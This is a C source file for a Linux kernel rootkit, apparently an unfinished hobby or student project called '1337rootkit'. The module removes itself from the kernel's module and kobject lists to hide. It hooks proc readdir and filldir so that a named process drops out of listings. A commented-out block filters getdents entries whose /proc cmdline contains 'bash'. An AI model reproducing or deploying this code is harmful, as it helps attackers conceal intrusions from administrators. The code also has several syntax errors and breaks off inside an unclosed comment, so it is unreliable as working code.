//allows us to perform certain kernel-level operations, such as printk
#include <linux/ctype.h>
#include <linux/dcache.h>
#include <linux/file.h>
#include <linux/kernel.h>
//allows us to create the module
#include <linux/module.h>
//allows us to change memory protection settings for the system call table
#include <linux/highmem.h>
//contains the system call numbers
#include <asm/unistd.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/syscalls.h>

static int rootkit_hidden = 0; /*boolean flag desginating the hidden status for the rootkit */
static char *procToHide; = "test";
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static filldir_t real_filldir;
static int (*real_proc_readdir)(struct file*, void*, filldir_t);

/*
Remove our rootkit from list of modules and kernel objects.
*/
static void rootkit_hide(void) {

	if (module_hidden) return;
	printk(KERN_INFO "hiding 1337rootkit\n");

	/*store the previous module of the list if we need to reference it*/
	module_previous = THIS_MODULE->list.prev;
	
	list_del (&THIS_MODULE->list);

	/*store the previous kernel object of the list if we need to reference it*/
	module_kobj_previous = THIS_MODULE->mkobj.kobj,entry.prev;
	
	kobject_del (&THIS_MODULE->mkobj.kobj);
	list_del (&THIS_MODULE->mkobj.kobj.entry);
	printk(KERN_INFO "1337rootkit hidden\n");

}

static int hijacked_filldir(void *buf, char *proc_name, int len, loff_off, u32 ino, unsigned int d_type) {
	/* hiding the process */

	if(procToHide) {
		if (!strcmp(proc_name, procToHide)){
			printk("Hiding %s\n", procToHide);
			/* if found process name matches our designated process name, do nothing and return */
			return 0;	
	}
	/*otherwise perform the filldir syscall as normal */
	return real_filldir(buf, proc_name, len, off, ino, d_type);
}

static int hijacked_readdir(struct file *filep, void *dirent, filldir_t filldir) {
	/*hijacked readdir that reads our hijacked filldir buffer */

	real_filldir = filldir; /*store the real filldir */
	
	return real_proc_readdir(filep, dirent, hijacked_filldir);
}

/*
pdirp = cdirp;
		cdirp = (struct linux_dirent*)(start_offset + i);
		
		if (isnumber(cdirp->d_name)){ //dirent is a process
			for (k = 0; k<1024; k++){
				kbuf[k] = 0;
				kbuf2[k] = 0;
			}
			//initialize kbuf2 to the process cmdline folder /proc/<PID>/cmdline
			kbuf2[0] = '/';
			kbuf2[1] = 'p';
			kbuf2[2] = 'r';
			kbuf2[3] = 'o';
			kbuf2[4] = 'c';
			kbuf2[5] = '/';
			size = strlen(cdirp->d_name);
			for (k = 0; k < size; k++){
				kbuf2[k+6] = (cdirp->d_name)[k];
			}
			kbuf2[size+6] = '/';
			kbuf2[size+7] = 'c';
			kbuf2[size+8] = 'm';
			kbuf2[size+9] = 'd';
			kbuf2[size+10] = 'l';
			kbuf2[size+11] = 'i';
			kbuf2[size+12] = 'n';
			kbuf2[size+13] = 'e';
			//open
			fcmdline = filp_open(kbuf2, O_RDONLY,0);
			
			if (fcmdline == NULL) printk(KERN_ALERT "filp_open error.\n");
			else {
				//get current segment descriptor
				fs = get_fs();
				//set segment descriptor associated to kernel space
				set_fs(get_ds());
				//read file
				fcmdline->f_op->read(fcmdline, kbuf, 1024, &fcmdline->f_pos);
				//restore segment descriptor
				set_fs(fs);
				//check process for "test"
				printk(KERN_INFO "kbuf: %s\n",kbuf);
				if(strstr(kbuf, "bash")!=NULL){
					printk("File to hide %s\n", kbuf2);
					if(i>0) {
						pdirp->d_reclen += cdirp->d_reclen;
					}
					else dirp = (struct linux_dirent *)(start_offset + (long)(cdirp->d_reclen));
					
					//adjust numread total returned by getdents and set cdirp to the new adjusted entry
					//num_reads -= pdirp->d_reclen;
					//cdirp=pdirp;
				}

			}
			filp_close(fcmdline, NULL);
			*/